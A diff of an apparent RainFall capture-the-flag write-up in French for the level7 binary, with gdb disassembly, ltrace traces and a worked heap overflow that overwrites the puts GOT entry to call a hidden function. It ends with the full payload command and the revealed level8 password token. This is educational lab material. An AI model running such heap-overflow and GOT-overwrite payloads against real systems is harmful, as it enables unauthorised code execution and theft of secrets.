@@ -1,28 +1,26 @@
-./level7
-SEGV
-
+(gdb) disass main
 Dump of assembler code for function main:
    0x08048521 <+0>:     push   %ebp
    0x08048522 <+1>:     mov    %esp,%ebp
    0x08048524 <+3>:     and    $0xfffffff0,%esp
    0x08048527 <+6>:     sub    $0x20,%esp
-   0x0804852a <+9>:     movl   $0x8,(%esp)              
-   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>   malloc de 8
+   0x0804852a <+9>:     movl   $0x8,(%esp)
+   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
    0x08048536 <+21>:    mov    %eax,0x1c(%esp)
    0x0804853a <+25>:    mov    0x1c(%esp),%eax
    0x0804853e <+29>:    movl   $0x1,(%eax)
    0x08048544 <+35>:    movl   $0x8,(%esp)
-   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>   malloc de 8
+   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
    0x08048550 <+47>:    mov    %eax,%edx
    0x08048552 <+49>:    mov    0x1c(%esp),%eax
    0x08048556 <+53>:    mov    %edx,0x4(%eax)
    0x08048559 <+56>:    movl   $0x8,(%esp)
-   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>   malloc de 8
+   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
    0x08048565 <+68>:    mov    %eax,0x18(%esp)
    0x08048569 <+72>:    mov    0x18(%esp),%eax
    0x0804856d <+76>:    movl   $0x2,(%eax)
    0x08048573 <+82>:    movl   $0x8,(%esp)
-   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>   malloc de 8
+   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
    0x0804857f <+94>:    mov    %eax,%edx
    0x08048581 <+96>:    mov    0x18(%esp),%eax
    0x08048585 <+100>:   mov    %edx,0x4(%eax)
@@ -37,7 +35,7 @@ Dump of assembler code for function main:
    0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
    0x080485a5 <+132>:   mov    0xc(%ebp),%eax
    0x080485a8 <+135>:   add    $0x8,%eax
----Type <return> to continue, or q <return> to quit---   0x080485ab <+138>:  mov    (%eax),%eax
+   0x080485ab <+138>:   mov    (%eax),%eax
    0x080485ad <+140>:   mov    %eax,%edx
    0x080485af <+142>:   mov    0x18(%esp),%eax
    0x080485b3 <+146>:   mov    0x4(%eax),%eax
@@ -56,6 +54,70 @@ Dump of assembler code for function main:
    0x080485f0 <+207>:   movl   $0x8048703,(%esp)
    0x080485f7 <+214>:   call   0x8048400 <puts@plt>
    0x080485fc <+219>:   mov    $0x0,%eax
-   0x08048601 <+224>:   leave  
-   0x08048602 <+225>:   ret    
+   0x08048601 <+224>:   leave
+   0x08048602 <+225>:   ret
 End of assembler dump.
+
+(gdb) disass m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:     push   %ebp
+   0x080484f5 <+1>:     mov    %esp,%ebp
+   0x080484f7 <+3>:     sub    $0x18,%esp
+   0x080484fa <+6>:     movl   $0x0,(%esp)
+   0x08048501 <+13>:    call   0x80483d0 <time@plt>
+   0x08048506 <+18>:    mov    $0x80486e0,%edx
+   0x0804850b <+23>:    mov    %eax,0x8(%esp)
+   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:    mov    %edx,(%esp)
+   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:    leave
+   0x08048520 <+44>:    ret
+End of assembler dump.
+
+En testant, on comprend que notre programme a besoin de deux parametres afin de se lancer.
+Si on lance la fonction normalement avec 2 arguments courts, le puts en +214 nous ecris ~~.
+Pour mieux comprendre on utilise ltrace
+
+level7@RainFall:~$ ltrace ./level7 coucouco cc
+__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                         = 0x0804a008
+malloc(8)                                         = 0x0804a018
+malloc(8)                                         = 0x0804a028
+malloc(8)                                         = 0x0804a038
+strcpy(0x0804a018, "coucouco")                    = 0x0804a018
+strcpy(0x0804a038, "cc")                          = 0x0804a038
+fopen("/home/user/level8/.pass", "r")             = 0
+fgets( <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Donc argv1 est la source du premier strcpy et argv2 du second.
+Si la premiere chaine depasse 20char, on observe quelle deborde sur la destination du second strcpy
+
+level7@RainFall:~$ ltrace ./level7 coucoucoucoucoucouccAAAA coucou
+__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                         = 0x0804a008
+malloc(8)                                         = 0x0804a018
+malloc(8)                                         = 0x0804a028
+malloc(8)                                         = 0x0804a038
+strcpy(0x0804a018, "coucoucoucoucoucouccAAAA")    = 0x0804a018
+strcpy(0x41414141, "coucou" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
+
+Nous remarquons que fopen prend deux arguments:
+fd = fopen("/home/user/level8/.pass","r");
+
+et que fgets prend 3 arguments:
+fgets(c, 68, fd);
+
+La constante globale c est donc une chaine de caractère qui récupère ce qu'il y a dans le fd soit
+le token contenu dans /home/user/level8/.pass
+
+On remarque la fonction m qui n'est pas utilisée dans ce programme et qui affiche avec un printf la variable globale c
+ainsi que time. Nous devons donc trouver un moyen que le programme se déroule sans encombres jusqu'après fgets puis qu'on appelle m.
+Nous allons donc remplacer puts par l'appelle de m. On utilise pour cela strcpy:
+On met dans le 2e strcpy la destination (adresse dynamique de puts) et dans la source l'adresse de m.
+La fonction m est donc appelée à la place de puts.
+
+level7@RainFall:~$ ./level7 $(python -c 'print 20*"A"+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
